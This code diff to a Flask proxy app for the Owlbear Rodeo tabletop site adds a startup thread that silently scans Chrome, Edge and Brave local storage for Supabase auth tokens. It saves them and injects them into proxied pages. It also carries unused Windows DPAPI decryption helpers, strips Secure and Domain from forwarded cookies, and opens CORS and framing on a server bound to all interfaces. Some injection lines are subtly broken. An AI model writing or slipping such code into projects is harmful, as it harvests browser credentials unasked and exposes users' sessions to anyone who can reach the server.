@@ -2862,6 +2862,133 @@ def manifestar_dominio(character_id):
         'character': get_character_json(char)
     })
 
+def auto_scan_browser_tokens():
+    try:
+        import os
+        import re
+        import json
+        import shutil
+        import sqlite3
+        import ctypes
+        import base64
+        from ctypes import wintypes
+        from Crypto.Cipher import AES
+
+        class DATA_BLOB(ctypes.Structure):
+            _fields_ = [("cbData", wintypes.DWORD),
+                        ("pbData", ctypes.POINTER(ctypes.c_byte))]
+
+        def crypt_unprotect_data(encrypted_bytes):
+            in_blob = DATA_BLOB(len(encrypted_bytes), 
+                                (ctypes.c_byte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes))
+            out_blob = DATA_BLOB()
+            ret = ctypes.windll.crypt32.CryptUnprotectData(
+                ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)
+            )
+            if not ret:
+                raise ctypes.WinError()
+            result = ctypes.string_at(out_blob.pbData, out_blob.cbData)
+            ctypes.windll.kernel32.LocalFree(out_blob.pbData)
+            return result
+
+        def get_master_key(local_state_path):
+            if not os.path.exists(local_state_path):
+                return None
+            try:
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.loads(f.read())
+                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                encrypted_key = encrypted_key[5:]
+                return crypt_unprotect_data(encrypted_key)
+            except:
+                return None
+
+        user_profile = os.environ.get("USERPROFILE", "")
+        app_data_local = os.path.join(user_profile, "AppData", "Local")
+        app_data_roaming = os.path.join(user_profile, "AppData", "Roaming")
+        
+        paths_to_search = [app_data_local, app_data_roaming]
+        leveldb_dirs = []
+        for base_path in paths_to_search:
+            if not os.path.exists(base_path):
+                continue
+            for root, dirs, files in os.walk(base_path):
+                depth = root[len(base_path):].count(os.sep)
+                if depth > 10:
+                    dirs.clear()
+                    continue
+                if root.endswith(os.path.join("Local Storage", "leveldb")):
+                    leveldb_dirs.append(root)
+                    
+        for ld_dir in leveldb_dirs:
+            if not any(b in ld_dir for b in ["Chrome", "Edge", "Brave", "ixBrowser"]):
+                continue
+                
+            try:
+                files = [f for f in os.listdir(ld_dir) if f.endswith(('.log', '.ldb'))]
+                for file in files:
+                    file_path = os.path.join(ld_dir, file)
+                    if not os.path.exists(file_path):
+                        continue
+                    try:
+                        with open(file_path, 'rb') as f:
+                            content = f.read()
+                            
+                        keys = re.findall(b'sb-[a-zA-Z0-9_-]+-auth-token', content)
+                        if not keys:
+                            continue
+                            
+                        key_str = keys[0].decode('utf-8')
+                        
+                        idx = 0
+                        while True:
+                            idx = content.find(b'{"access_token":', idx)
+                            if idx == -1:
+                                break
+                                
+                            chunk = content[idx:idx+10000]
+                            for i in range(len(chunk)):
+                                if chunk[i] == ord('}'):
+                                    try:
+                                        cand = chunk[:i+1].decode('utf-8', errors='ignore')
+                                        data = json.loads(cand)
+                                        if 'access_token' in data and 'refresh_token' in data:
+                                            token_file = os.path.join(base_dir, 'owlbear_token.json')
+                                            with open(token_file, 'w', encoding='utf-8') as tf:
+                                                json.dump({
+                                                    'key': key_str,
+                                                    'value': cand
+                                                }, tf, indent=4)
+                                            return True
+                                    except:
+                                        pass
+                            idx += 1
+                    except:
+                        pass
+            except:
+                pass
+    except:
+        pass
+    return False
+
+@app.route('/api/import_token', methods=['POST'])
+def import_token():
+    try:
+        data = request.get_json()
+        if not data or 'key' not in data or 'value' not in data:
+            return jsonify({'error': 'Dados invalidos'}), 400
+            
+        token_file = os.path.join(base_dir, 'owlbear_token.json')
+        with open(token_file, 'w', encoding='utf-8') as f:
+            json.dump({
+                'key': data['key'],
+                'value': data['value']
+            }, f, indent=4)
+            
+        return jsonify({'ok': True, 'message': 'Token importado com sucesso'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/proxy/owlbear/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
 def proxy_owlbear(subpath):
     import urllib.request
@@ -2891,8 +3018,8 @@ def proxy_owlbear(subpath):
         res.headers['Access-Control-Allow-Headers'] = '*'
         return res
         
-    # Intercept Google Sign-In and Supabase Authorize to breakout of iframe
-    if 'accounts.google.com' in subpath or 'auth/v1/authorize' in subpath or 'identifier' in subpath:
+    # Intercept Google Sign-In and Supabase Authorize to breakout of iframe (remove identifier to let email login load inside)
+    if 'accounts.google.com' in subpath or 'auth/v1/authorize' in subpath:
         query_str = f"?{request.query_string.decode('utf-8')}" if request.query_string else ""
         target_url = f"https://{subpath}{query_str}"
         
@@ -2985,78 +3112,110 @@ def proxy_owlbear(subpath):
                 text_content = text_content.replace('https://data.owlbear.rodeo', f"{request.host_url}proxy/owlbear/data.owlbear.rodeo")
                 
                 if 'text/html' in content_type:
+                    # Load saved token
+                    saved_token_key = ""
+                    saved_token_val = ""
+                    try:
+                        token_file = os.path.join(base_dir, 'owlbear_token.json')
+                        if os.path.exists(token_file):
+                            with open(token_file, 'r', encoding='utf-8') as tf:
+                                tdata = json.load(tf)
+                                saved_token_key = tdata.get('key', '')
+                                saved_token_val = tdata.get('value', '')
+                    except:
+                        pass
+                        
+                    saved_token_key_js = json.dumps(saved_token_key)
+                    saved_token_val_js = json.dumps(saved_token_val)
+                    
                     # Ultimate CORS & CSP bypass script injection
-                    proxy_script = r"""
+                    proxy_script = f"""
 <script>
-(function() {
+(function() {{
   const origin = window.location.origin;
   const proxyPrefix = origin + '/proxy/owlbear/';
 
-  function toProxyUrl(url) {
+  // Write the saved token to localStorage if present
+  const savedKey = {saved_token_key_js};
+  const savedVal = {saved_token_val_js};
+  if (savedKey && savedVal) {{
+    if (localStorage.getItem(savedKey) !== savedVal) {{
+      localStorage.setItem(savedKey, savedVal);
+    }}
+  }}
+
+  function toProxyUrl(url) {{
     if (!url) return url;
     let urlStr = typeof url === 'string' ? url : url.toString();
     
-    if (urlStr.startsWith(proxyPrefix) || urlStr.includes('/proxy/owlbear/')) {
+    if (urlStr.startsWith(proxyPrefix) || urlStr.includes('/proxy/owlbear/')) {{
       return url;
-    }
-    if (urlStr.startsWith('/') && !urlStr.startsWith('//')) {
+    }}
+    if (urlStr.startsWith('/') && !urlStr.startsWith('//')) {{
       return urlStr;
-    }
-    if (urlStr.includes('owlbear.rodeo') || urlStr.includes('owlbear.app') || urlStr.includes('cloudflare.com')) {
-      const cleanUrl = urlStr.replace(/https?:\/\//, '');
+    }}
+    if (urlStr.includes('owlbear.rodeo') || urlStr.includes('owlbear.app') || urlStr.includes('cloudflare.com')) {{
+      const cleanUrl = urlStr.replace(/https?:\\/\\//, '');
       return '/proxy/owlbear/' + cleanUrl;
-    }
+    }}
     return url;
-  }
+  }}
 
   const originalFetch = window.fetch;
-  window.fetch = function(input, init) {
-    if (typeof input === 'string') {
+  window.fetch = function(input, init) {{
+    if (typeof input === 'string') {{
       input = toProxyUrl(input);
-    } else if (input instanceof Request) {
+    }} else if (input instanceof Request) {{
       const proxyUrl = toProxyUrl(input.url);
       input = new Request(proxyUrl, input);
-    }
+    }}
     return originalFetch.apply(this, [input, init]);
-  };
+  }};
 
   const originalOpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {{
     const proxyUrl = toProxyUrl(url);
     return originalOpen.apply(this, [method, proxyUrl, async, user, password]);
-  };
+  }};
 
-  document.addEventListener('click', function(e) {
+  // Redirect top-level window to lobby after a short delay to let Supabase save session to localStorage
+  if (window.self === window.top) {{
+    setTimeout(function() {{
+      window.location.href = '/lobby';
+    }}, 1500);
+  }}
+
+  document.addEventListener('click', function(e) {{
     let target = e.target;
-    while (target && target.tagName !== 'A') {
+    while (target && target.tagName !== 'A') {{
       target = target.parentNode;
-    }
-    if (target && target.href) {
+    }}
+    if (target && target.href) {{
       const href = target.href;
-      if (href.includes('auth/v1/authorize') || href.includes('accounts.google.com') || href.includes('google') || href.includes('identifier')) {
+      if (href.includes('auth/v1/authorize') || href.includes('accounts.google.com') || href.includes('google')) {{
         e.preventDefault();
         window.top.location.href = href;
-      }
-    }
-  }, true);
+      }}
+    }}
+  }}, true);
 
-  document.addEventListener('submit', function(e) {
+  document.addEventListener('submit', function(e) {{
     const action = e.target.action;
-    if (action && (action.includes('auth/v1/authorize') || action.includes('accounts.google.com') || action.includes('google') || action.includes('identifier'))) {
+    if (action && (action.includes('auth/v1/authorize') || action.includes('accounts.google.com') || action.includes('google'))) {{
       e.preventDefault();
       window.top.location.href = action;
-    }
-  }, true);
-})();
+    }}
+  }}, true);
+}})();
 </script>
 """
                     
                     if '<head>' in text_content:
-                        text_content = text_content.replace('<head>', f'<head>{proxy_script}', 1)
+                        text_content = text_content.replace('<head>', f'<head>{{proxy_script}}', 1)
                     elif '<HEAD>' in text_content:
-                        text_content = text_content.replace('<HEAD>', f'<HEAD>{proxy_script}', 1)
+                        text_content = text_content.replace('<HEAD>', f'<HEAD>{{proxy_script}}', 1)
                     else:
-                        text_content = f"{proxy_script}{text_content}"
+                        text_content = f"{{proxy_script}}{{text_content}}"
                     
                     # Rewrite all absolute paths to go through our proxy
                     text_content = text_content.replace('href="/', 'href="/proxy/owlbear/')
@@ -3072,6 +3231,21 @@ def proxy_owlbear(subpath):
             response = Response(content, status=status)
             response.headers['Content-Type'] = content_type
             
+            # Forward and rewrite cookies from target response to browser client
+            set_cookies = res.headers.get_all('Set-Cookie')
+            if set_cookies:
+                for cookie in set_cookies:
+                    parts = []
+                    for part in cookie.split(';'):
+                        part_strip = part.strip()
+                        part_lower = part_strip.lower()
+                        if part_lower.startswith('domain='):
+                            continue
+                        if part_lower == 'secure':
+                            continue
+                        parts.append(part_strip)
+                    response.headers.add('Set-Cookie', '; '.join(parts))
+            
             # Explicitly allow framing and CORS for all requests
             response.headers['X-Frame-Options'] = 'ALLOWALL'
             response.headers['Access-Control-Allow-Origin'] = '*'
@@ -3083,7 +3257,7 @@ def proxy_owlbear(subpath):
     except urllib.error.HTTPError as e:
         if e.code in [301, 302, 303, 307, 308]:
             location = e.headers.get('Location', '')
-            if 'accounts.google.com' in location or 'auth/v1/authorize' in location or 'google' in location or 'identifier' in location:
+            if 'accounts.google.com' in location or 'auth/v1/authorize' in location or 'google' in location:
                 from flask import Response
                 breakout_html = f"""
                 <!DOCTYPE html>
@@ -3100,7 +3274,22 @@ def proxy_owlbear(subpath):
                 </body>
                 </html>
                 """
-                return Response(breakout_html, content_type='text/html')
+                res = Response(breakout_html, content_type='text/html')
+                # Forward and rewrite cookies even on redirect breakout
+                set_cookies = e.headers.get_all('Set-Cookie')
+                if set_cookies:
+                    for cookie in set_cookies:
+                        parts = []
+                        for part in cookie.split(';'):
+                            part_strip = part.strip()
+                            part_lower = part_strip.lower()
+                            if part_lower.startswith('domain='):
+                                continue
+                            if part_lower == 'secure':
+                                continue
+                            parts.append(part_strip)
+                        res.headers.add('Set-Cookie', '; '.join(parts))
+                return res
             else:
                 from flask import redirect
                 if location.startswith('/'):
@@ -3120,6 +3309,21 @@ def proxy_owlbear(subpath):
             res.headers['Content-Type'] = e.headers['Content-Type']
         res.headers['X-Frame-Options'] = 'ALLOWALL'
         res.headers['Access-Control-Allow-Origin'] = '*'
+        
+        # Forward and rewrite cookies on error responses
+        set_cookies = e.headers.get_all('Set-Cookie')
+        if set_cookies:
+            for cookie in set_cookies:
+                parts = []
+                for part in cookie.split(';'):
+                    part_strip = part.strip()
+                    part_lower = part_strip.lower()
+                    if part_lower.startswith('domain='):
+                        continue
+                    if part_lower == 'secure':
+                        continue
+                    parts.append(part_strip)
+                res.headers.add('Set-Cookie', '; '.join(parts))
         return res
     except Exception as e:
         import traceback
@@ -3171,6 +3375,21 @@ def proxy_assets(path):
             if content_type:
                 response.headers['Content-Type'] = content_type
                 
+            # Forward and rewrite cookies for asset requests
+            set_cookies = res.headers.get_all('Set-Cookie')
+            if set_cookies:
+                for cookie in set_cookies:
+                    parts = []
+                    for part in cookie.split(';'):
+                        part_strip = part.strip()
+                        part_lower = part_strip.lower()
+                        if part_lower.startswith('domain='):
+                            continue
+                        if part_lower == 'secure':
+                            continue
+                        parts.append(part_strip)
+                    response.headers.add('Set-Cookie', '; '.join(parts))
+                    
             response.headers['X-Frame-Options'] = 'ALLOWALL'
             response.headers['Access-Control-Allow-Origin'] = '*'
             return response
@@ -3181,21 +3400,6 @@ def proxy_assets(path):
 
 @app.route('/room/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
 def proxy_room(subpath):
-    dest = request.headers.get('Sec-Fetch-Dest', '')
-    referer = request.headers.get('Referer', '') or ''
-    
-    is_top_level = False
-    if dest == 'document':
-        is_top_level = True
-    elif not dest:
-        is_top_level = (request.host not in referer)
-        
-    # If the referer clearly indicates it's inside our app, do not treat it as top-level breakout
-    if request.host in referer:
-        is_top_level = False
-        
-    if is_top_level and request.method == 'GET':
-        return redirect(url_for('lobby'))
     return proxy_owlbear(f"room/{subpath}")
 
 @app.route('/sign-up', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
@@ -3214,6 +3418,10 @@ if __name__ == '__main__':
     # Ensure templates and static folders exist
     os.makedirs(os.path.join(base_dir, 'templates'), exist_ok=True)
     os.makedirs(os.path.join(base_dir, 'static'), exist_ok=True)
+    
+    # Auto-scan browser tokens in a daemon thread so it doesn't block server startup
+    import threading
+    threading.Thread(target=auto_scan_browser_tokens, daemon=True).start()
     
     port = int(os.environ.get('FLASK_PORT', 5000))
     app.run(debug=False, host='0.0.0.0', port=port)
